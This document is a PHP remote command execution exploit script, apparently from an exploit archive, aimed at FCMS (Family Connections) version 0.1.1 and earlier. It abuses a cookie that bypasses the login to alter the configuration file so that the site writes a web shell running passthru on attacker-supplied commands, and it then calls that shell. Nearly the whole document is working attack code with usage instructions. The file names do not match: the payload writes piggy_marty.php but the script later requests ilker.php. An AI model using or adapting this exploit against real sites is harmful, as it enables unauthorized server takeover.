#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
# FCMS (Family Connections) <= 0.1.1 Remote Command Execution Exploit
# AUTHOR: ilker kandemir <ilkerkandemir[at]mynet.com>
# DOWNLOAD:http://sourceforge.net/project/showfiles.php?group_id=189733
# Thanks to rgod for the php code and Ajann for helps


";
if ($argc<3) {
echo "Usage: php ".$argv[0]." Host Path CMD
Host:          target server (ip/hostname)
Path:          path of FCMS

Example:
php ".$argv[0]." localhost /FCMS/ dir";

die;
}
/*
The problem is in index.php:

{
if (isset($_COOKIE['fcms_login_id'])) {
$_SESSION['login_id'] = $_COOKIE['fcms_login_id'];
}


This exploit create a ilker.php shell on the victim site

*/

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
    $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
    }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or 
(!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";
for ($i=3; $i<=$argc-1; $i++){
$cmd.=" ".$argv[$i];
}
$cmd=urlencode($cmd);


$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... 
check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "Step0 - See If ilker.php already exists..\r\n";
$packet="GET ".$p."ilker.php?cmd=$cmd HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=$cmd\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"666999"))
{
  echo "Exploit succeeded...\r\n";
  $temp=explode("666999",$html);
  die("\r\n".$temp[1]."\r\n");
}

echo "Step1 - Retrieving Configuration\r\n";
$packet="GET ".$p."index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: admin=ilker\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("<textarea name=\"content\" cols=\"80\" rows=\"20\">", 
$html);
$config_file=explode("</textarea><br /><input type=\"submit\" 
/></form>", $temp[1]);
$new_file = str_replace('?>', '
$fp=fopen(\'piggy_marty.php\',\'w\');
fputs($fp,\'<?php error_reporting(0);
set_time_limit(0);
if (get_magic_quotes_gpc()) {
$_GET[cmd]=stripslashes($_GET[cmd]);
}
echo 666999;
passthru($_GET[cmd]);
echo 666999;
?>\');
fclose($fp);
chmod(\'ilker.php\',777);
?>', $config_file[0]);

echo "Step2 - Uploading New Data..\r\n";
$data="content=".urlencode($new_file);
$packet="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, 
application/x-shockwave-flash, * /*\r\n";
$packet.="Referer: http://".$host.$path."index.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; 
SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: fcms_login_id=ilker\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

echo "Step3 - Executing Shell Maker\r\n";
$packet="GET ".$p."index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: \r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
sleep(3);
echo "Step4 - Executing Shell..\r\n";
$packet="GET ".$p."ilker.php?cmd=$cmd HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=$cmd\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"666999"))
{
  echo "Exploit succeeded...\r\n";
  $temp=explode("666999",$html);
  die("\r\n".$temp[1]."\r\n");
}

?>

# MefistoLabs.Com

